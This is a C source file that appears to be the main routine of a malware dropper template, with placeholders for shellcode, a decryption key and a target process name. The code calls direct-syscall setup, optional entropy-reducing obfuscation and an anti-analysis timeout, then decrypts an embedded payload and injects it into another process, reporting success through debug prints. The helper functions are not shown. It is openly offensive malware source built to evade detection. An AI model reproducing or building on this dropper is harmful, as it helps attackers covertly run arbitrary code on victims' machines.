#include "dropper.h"
#include "common.h"


/* SHELLCODE */

/* KEY */


int main() {

    DebugPrint("Debug mode enabled.\n");
    DebugPrint("Dropper started...\n");

    InitializeSyscalls();

#ifdef ENTROPY_REDUCTION_ENABLED
    init_obfuscation();
#endif

#ifdef ANTI_ANALYSIS_ENABLED
    AntiAnalysis(30000); // 30 seconds timeout
#endif

BOOL bSuccess;

#ifdef ENCRYPTED_PAYLOAD
    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key));
#else
    bSuccess = decrypt(Payload, sizeof(Payload), NULL, 0);
#endif

    if (!bSuccess) {
        DebugPrint("[X] Failed to decrypt payload.\n");
       return 1;
    }

#ifdef PROCESS_NAME_ENABLED
    LPWSTR szProcessName =  /* PROCESS_NAME */;
    bSuccess = inject_payload(Payload, sizeof(Payload), szProcessName);
#else
    bSuccess = inject_payload(Payload, sizeof(Payload));
#endif

    if (bSuccess) {
        DebugPrint("[i] Payload injected successfully.\n");
    } else {
        DebugPrint("[X] Failed to inject payload.\n");
    }

    return 0;
}